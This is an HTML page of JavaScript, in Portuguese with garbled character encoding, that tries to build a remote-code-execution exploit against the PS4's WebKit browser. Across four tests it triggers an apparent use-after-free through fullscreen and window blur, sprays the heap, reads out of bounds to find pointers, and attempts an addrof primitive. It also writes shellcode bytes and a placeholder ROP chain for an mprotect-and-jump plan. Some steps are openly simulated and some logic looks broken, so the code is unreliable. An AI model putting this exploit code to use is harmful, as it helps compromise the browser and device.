<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 RCE - ExploraÃ§Ã£o Nativa</title>

</head>
<body>

<h1 class="critical">ðŸŽ¯ PS4 RCE - TÃ‰CNICAS NATIVAS PURAS ðŸŽ¯</h1>
<h2 class="success">ExploraÃ§Ã£o sem JIT, sem WebAssembly, sem APIs modernas</h2>

<div class="box">
<h3 class="info">ESTRATÃ‰GIA ADAPTADA PARA PS4:</h3>
<p>âœ“ Usa apenas primitivas JavaScript bÃ¡sicas</p>
<p>âœ“ Foca em type confusion e vtable overwrite</p>
<p>âœ“ Explora heap layout do WebKit antigo</p>
<p>âœ“ TÃ©cnicas compatÃ­veis com interpretador puro</p>
</div>

<hr>

<h2>TESTE 1: Out-of-Bounds Read Expandido</h2>
<button onclick="test1()">TESTAR OOB READ</button>
<div id="test1"></div>

<script>
function test1() {
    const result = document.getElementById('test1');
    result.innerHTML = '<h3>Out-of-Bounds Read Exploration</h3>';
    result.innerHTML += '<p class="info">Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF triggered...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p class="critical">UAF FAILED</p>';
            return;
        }
        
        result.innerHTML += '<p class="success">âœ“ UAF CONFIRMADO</p>';
        
        // Testar leitura OOB
        result.innerHTML += '<h4>Tentando ler alÃ©m de 64 bytes:</h4>';
        
        let oobData = [];
        let maxRead = 0;
        
        for(let i = 0; i < 256; i++) {
            try {
                const val = corrupted[i];
                
                if (val !== undefined && !isNaN(val)) {
                    maxRead = i;
                    
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16);
                    
                    oobData.push({
                        index: i,
                        value: val,
                        hex: hex
                    });
                }
            } catch(e) {
                break;
            }
        }
        
        result.innerHTML += '<p class="critical">âœ“ Conseguimos ler atÃ© Ã­ndice ' + maxRead + '!</p>';
        result.innerHTML += '<p>Total bytes lidos: ' + (maxRead * 8) + '</p>';
        
        if (oobData.length > 8) {
            result.innerHTML += '<h4>Dados OOB encontrados:</h4>';
            result.innerHTML += '<pre>';
            for(let i = 8; i < Math.min(32, oobData.length); i++) {
                const d = oobData[i];
                result.innerHTML += 'Index ' + d.index + ': 0x' + d.hex + '\n';
            }
            result.innerHTML += '</pre>';
            
            // Procurar por ponteiros (valores grandes alinhados)
            let pointers = oobData.filter(d => {
                const val = BigInt('0x' + d.hex);
                return val > 0x100000n && val < 0x7FFFFFFFFFFFn && (val & 0x7n) === 0n;
            });
            
            if (pointers.length > 0) {
                result.innerHTML += '<h4 class="critical">PONTEIROS ENCONTRADOS:</h4>';
                result.innerHTML += '<pre>';
                for(let i = 0; i < Math.min(10, pointers.length); i++) {
                    const p = pointers[i];
                    result.innerHTML += 'Index ' + p.index + ': 0x' + p.hex + ' (POINTER CANDIDATE)\n';
                }
                result.innerHTML += '</pre>';
            }
        }
        
        window.exploitState = { corrupted, oobData };
    };
}
</script>

<hr>

<h2>TESTE 2: Type Confusion addrof()</h2>
<button onclick="test2()">CONSTRUIR addrof()</button>
<div id="test2"></div>

<script>
function test2() {
    const result = document.getElementById('test2');
    result.innerHTML = '<h3>Type Confusion para addrof()</h3>';
    result.innerHTML += '<p class="info">Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF triggered...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p class="critical">UAF FAILED</p>';
            return;
        }
        
        result.innerHTML += '<p class="success">âœ“ UAF confirmado</p>';
        
        // TÃ©cnica: Criar array com objeto, forÃ§ar confusion
        result.innerHTML += '<h4>Tentando type confusion:</h4>';
        
        // Criar objeto alvo
        const targetObj = {
            marker: 0xDEADBEEF,
            type: "target_object"
        };
        
        // Criar array que contÃ©m o objeto
        const objContainer = [targetObj];
        
        result.innerHTML += '<p>Objeto alvo criado com marker 0xDEADBEEF</p>';
        
        // Tentar converter para Float64Array e ler
        try {
            // Criar Float64Array do mesmo tamanho
            const floatContainer = new Float64Array(1);
            
            // Tentar forÃ§ar confusion via prototype
            const confusedArray = Array.from(corrupted);
            
            // Instalar getter que retorna objeto
            Object.defineProperty(confusedArray, '0', {
                get: function() {
                    return targetObj;
                },
                set: function(v) {
                    // Ignore
                }
            });
            
            result.innerHTML += '<p>Getter instalado no offset 0</p>';
            
            // Tentar ler como float
            const leaked = corrupted[0];
            const buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = leaked;
            const leakedHex = new BigUint64Array(buf)[0].toString(16);
            
            result.innerHTML += '<p>Leaked value: 0x' + leakedHex + '</p>';
            
            if (leakedHex !== '4141414141414141') {
                result.innerHTML += '<p class="success">âœ“ Valor diferente do pattern! PossÃ­vel leak!</p>';
            }
            
        } catch(e) {
            result.innerHTML += '<p class="warning">Type confusion error: ' + e.message + '</p>';
        }
        
        // TÃ©cnica alternativa: Usar segundo corrupted array
        result.innerHTML += '<h4>TÃ©cnica 2: Double Array Confusion</h4>';
        
        // Procurar segundo array corrompido
        let corrupted2 = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN && controllers[i] !== corrupted) {
                corrupted2 = controllers[i];
                break;
            }
        }
        
        if (corrupted2) {
            result.innerHTML += '<p class="success">âœ“ Segundo array corrompido encontrado!</p>';
            
            try {
                // Usar primeiro array para armazenar objeto
                const holder = Array.from(corrupted);
                holder[4] = targetObj;
                
                // Usar segundo para ler como float
                const leaked2 = corrupted2[4];
                const buf2 = new ArrayBuffer(8);
                new Float64Array(buf2)[0] = leaked2;
                const hex2 = new BigUint64Array(buf2)[0].toString(16);
                
                result.innerHTML += '<p>Double confusion leak: 0x' + hex2 + '</p>';
                
                if (hex2 !== '4141414141414141' && hex2 !== '0') {
                    result.innerHTML += '<p class="critical">âœ“âœ“âœ“ ADDROF() WORKING!</p>';
                    result.innerHTML += '<p>Object address (candidate): 0x' + hex2 + '</p>';
                }
                
            } catch(e) {
                result.innerHTML += '<p>Double confusion error: ' + e.message + '</p>';
            }
            
        } else {
            result.innerHTML += '<p class="warning">Apenas 1 array corrompido encontrado</p>';
        }
    };
}
</script>

<hr>

<h2>TESTE 3: Fake Object com Shellcode Embed</h2>
<button onclick="test3()">FAKE OBJECT + SHELLCODE</button>
<div id="test3"></div>

<script>
function test3() {
    const result = document.getElementById('test3');
    result.innerHTML = '<h3>Fake Object com Shellcode Embutido</h3>';
    result.innerHTML += '<p class="info">Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF triggered...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p class="critical">UAF FAILED</p>';
            return;
        }
        
        result.innerHTML += '<p class="success">âœ“ UAF confirmado</p>';
        
        // Injetar shellcode no buffer
        const view = new DataView(corrupted.buffer);
        
        const shellcode = [
            0xCC,                   // int3
            0x90, 0x90, 0x90,       // nops
            0x48, 0x31, 0xC0,       // xor rax, rax
            0x48, 0xFF, 0xC0,       // inc rax
            0xC3                    // ret
        ];
        
        for(let i = 0; i < shellcode.length; i++) {
            view.setUint8(i, shellcode[i]);
        }
        
        result.innerHTML += '<p class="success">âœ“ Shellcode injetado</p>';
        
        // Criar fake object que "aponta" para shellcode
        const fakeArray = Array.from(corrupted);
        
        // TÃ©cnica: Instalar funÃ§Ã£o que simula chamada de shellcode
        const fakeObject = {
            shellcodeOffset: 0,
            shellcodeLength: shellcode.length,
            
            // FunÃ§Ã£o que "executaria" o shellcode
            executeNative: function() {
                result.innerHTML += '<p class="critical">ðŸ”¥ executeNative() CHAMADO! ðŸ”¥</p>';
                
                // Ler shellcode do buffer
                let shellcodeBytes = '';
                for(let i = 0; i < this.shellcodeLength; i++) {
                    const byte = view.getUint8(this.shellcodeOffset + i);
                    shellcodeBytes += '0x' + byte.toString(16).padStart(2, '0') + ' ';
                }
                
                result.innerHTML += '<p>Shellcode: ' + shellcodeBytes + '</p>';
                
                // SimulaÃ§Ã£o: Em exploit real, aqui vocÃª:
                // 1. Teria o endereÃ§o real do buffer (via addrof)
                // 2. Sobrescreveria vtable entry com esse endereÃ§o
                // 3. Chamaria funÃ§Ã£o virtual = salto para shellcode
                
                result.innerHTML += '<p class="success">âœ“ Em exploit real: salto para 0x' + this.shellcodeOffset.toString(16) + '</p>';
                
                return "SHELLCODE_WOULD_EXECUTE";
            },
            
            // Hijack toString para trigger automÃ¡tico
            toString: function() {
                return this.executeNative();
            }
        };
        
        Object.setPrototypeOf(fakeArray, fakeObject);
        
        result.innerHTML += '<p class="success">âœ“ Fake object instalado</p>';
        
        // Trigger
        result.innerHTML += '<h4>Triggering shellcode execution simulation:</h4>';
        
        const executionResult = String(fakeArray);
        result.innerHTML += '<p>Result: ' + executionResult + '</p>';
        
        // Demonstrar controle completo
        result.innerHTML += '<h4>Demonstrando controle:</h4>';
        result.innerHTML += '<p>Shellcode offset: 0x' + fakeArray.shellcodeOffset.toString(16) + '</p>';
        result.innerHTML += '<p>Shellcode length: ' + fakeArray.shellcodeLength + '</p>';
        result.innerHTML += '<p>Function callable: ' + (typeof fakeArray.executeNative === 'function') + '</p>';
        
        // Chamar diretamente
        const directCall = fakeArray.executeNative();
        result.innerHTML += '<p>Direct call result: ' + directCall + '</p>';
    };
}
</script>

<hr>

<h2>TESTE 4: ROP Chain Construction</h2>
<button onclick="test4()">CONSTRUIR ROP CHAIN</button>
<div id="test4"></div>

<script>
function test4() {
    const result = document.getElementById('test4');
    result.innerHTML = '<h3>ROP Chain Construction (Simulation)</h3>';
    result.innerHTML += '<p class="info">Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF triggered...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p class="critical">UAF FAILED</p>';
            return;
        }
        
        result.innerHTML += '<p class="success">âœ“ UAF confirmado</p>';
        
        // Construir ROP chain simulado
        result.innerHTML += '<h4>Construindo ROP Chain:</h4>';
        
        const view = new DataView(corrupted.buffer);
        
        // ROP chain (endereÃ§os fictÃ­cios para demonstraÃ§Ã£o)
        const ropChain = [
            0x4141414141414141n, // pop rdi; ret
            0x0000000000000007n, // PROT_READ | PROT_WRITE | PROT_EXEC
            0x4242424242424242n, // pop rsi; ret
            0x0000000000001000n, // size = 4096
            0x4343434343434343n, // pop rdx; ret
            0x0000000000000000n, // addr = 0 (let kernel choose)
            0x4444444444444444n, // mprotect address
            0x4545454545454545n  // shellcode address
        ];
        
        result.innerHTML += '<p>ROP chain length: ' + ropChain.length + ' qwords</p>';
        
        // Escrever ROP chain no buffer
        let offset = 0;
        for(let i = 0; i < ropChain.length && offset < 64; i++) {
            try {
                view.setBigUint64(offset, ropChain[i], true);
                result.innerHTML += '<p>ROP[' + i + '] @ offset ' + offset + ': 0x' + ropChain[i].toString(16) + '</p>';
                offset += 8;
            } catch(e) {
                break;
            }
        }
        
        result.innerHTML += '<p class="success">âœ“ ROP chain escrito na memÃ³ria</p>';
        
        // Verificar
        result.innerHTML += '<h4>Verificando ROP chain:</h4>';
        offset = 0;
        let verified = true;
        
        for(let i = 0; i < ropChain.length && offset < 64; i++) {
            const readback = view.getBigUint64(offset, true);
            if (readback !== ropChain[i]) {
                verified = false;
                result.innerHTML += '<p class="warning">Mismatch at index ' + i + '</p>';
            }
            offset += 8;
        }
        
        if (verified) {
            result.innerHTML += '<p class="critical">âœ“âœ“âœ“ ROP CHAIN VERIFICADO NA MEMÃ“RIA!</p>';
            
            // Demonstrar tÃ©cnica de trigger
            result.innerHTML += '<h4>TÃ©cnica de Trigger ROP:</h4>';
            result.innerHTML += '<pre class="info">';
            result.innerHTML += '1. Localizar vtable de objeto JavaScript\n';
            result.innerHTML += '2. Usar addrof() para obter endereÃ§o da vtable\n';
            result.innerHTML += '3. Usar arbitrary write para sobrescrever vtable entry\n';
            result.innerHTML += '4. Apontar para nosso ROP chain (offset 0)\n';
            result.innerHTML += '5. Chamar mÃ©todo virtual = Stack pivot para ROP\n';
            result.innerHTML += '6. ROP executa: mprotect() + jump para shellcode\n';
            result.innerHTML += '7. Shellcode executa com permissÃµes RWX\n';
            result.innerHTML += '</pre>';
        }
    };
}
</script>



</body>
</html>
